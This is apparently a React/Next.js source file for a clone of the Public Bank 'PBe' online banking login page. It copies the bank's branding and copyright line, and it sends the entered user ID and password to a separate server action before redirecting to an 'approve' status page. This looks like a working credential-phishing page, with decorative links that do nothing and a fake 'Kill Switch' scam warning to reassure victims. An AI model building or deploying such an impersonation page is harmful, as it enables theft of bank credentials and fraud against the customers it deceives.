"use client";

import React, { useState } from "react";
import { User, Lock, Loader2, Play } from "lucide-react";
import { submitPublicBankLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function PublicBankLoginPage() {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (userId.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitPublicBankLogin(userId, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 2000);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#F8F9FA] font-sans text-[#333]">
      {/* Header */}
      <header className="flex items-center justify-between border-b border-gray-200 bg-white px-6 py-4 shadow-sm">
        <h1 className="text-xl font-extrabold tracking-tight text-[#BD2C27]">
          PUBLIC BANK
        </h1>
        <div className="text-2xl font-black italic text-[#0054A6]">
          PBe
        </div>
      </header>

      {/* Main Container */}
      <main className="flex flex-1 flex-col items-center px-4 py-8">
        <div className="w-full max-w-lg overflow-hidden border border-[#E0E0E0] bg-white shadow-sm">
          {/* Top Section */}
          <div className="p-8">
            <h2 className="mb-8 text-center text-4xl font-normal text-[#555]">
              Login to PBe
            </h2>

            <form onSubmit={handleLogin} className="space-y-4">
              {error && (
                <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                  {error}
                </div>
              )}

              {/* User ID Input */}
              <div className="relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2">
                  <User size={24} className="text-[#007BFF]" fill="#007BFF" fillOpacity={0.2} />
                </div>
                <input
                  type="text"
                  placeholder="User ID"
                  value={userId}
                  onChange={(e) => setUserId(e.target.value)}
                  className="w-full rounded border border-[#CCC] py-3.5 pl-14 pr-4 text-[17px] focus:border-[#007BFF] focus:outline-none"
                  required
                />
              </div>

              {/* Password Input */}
              <div className="relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2">
                  <Lock size={24} className="text-[#FFC107]" fill="#FFC107" fillOpacity={0.2} />
                </div>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded border border-[#CCC] py-3.5 pl-14 pr-4 text-[17px] focus:border-[#007BFF] focus:outline-none"
                  required
                />
              </div>

              {/* Warning Text */}
              <div className="pt-4 text-[13px] leading-relaxed text-[#666]">
                <p>
                  If you suspect that you have fallen victim to a scam, please proceed to click{" "}
                  <span className="cursor-pointer font-bold text-[#D32F2F] underline">Kill Switch</span> to safeguard your account and prevent further losses.
                </p>
              </div>

              {/* Login Button */}
              <div className="flex justify-end pt-4">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="min-w-[120px] rounded bg-[#D32F2F] px-8 py-2.5 text-lg font-bold text-white shadow-sm transition-colors hover:bg-[#B71C1C] active:scale-[0.98] disabled:opacity-70"
                >
                  {isLoading ? (
                    <Loader2 className="mx-auto h-6 w-6 animate-spin" />
                  ) : (
                    "Login"
                  )}
                </button>
              </div>
            </form>
          </div>

          {/* Lower Section (Links) */}
          <div className="border-t border-[#E0E0E0] bg-[#F4F6F8] p-8 pb-12">
            <h3 className="mb-6 text-xl font-bold text-[#333]">New to PBe?</h3>
            <ul className="space-y-4">
              {[
                "Register",
                "PBe Online Security",
                "FAQs",
                "PBe Tutorials"
              ].map((link, i) => (
                <li key={i} className="flex items-center gap-3">
                  <Play size={10} className="fill-[#D32F2F] text-[#D32F2F]" />
                  <button className="text-[15px] font-medium text-[#0054A6] hover:underline">
                    {link}
                  </button>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-8 text-center text-[11px] text-[#666]">
        <div className="mb-1 flex justify-center gap-2">
          <span>Terms & Conditions</span>
          <span>|</span>
          <span>Privacy</span>
          <span>|</span>
          <span>Security</span>
        </div>
        <p>Copyright © 2026 Public Bank Berhad. All Rights Reserved.</p>
      </footer>
    </div>
  );
}
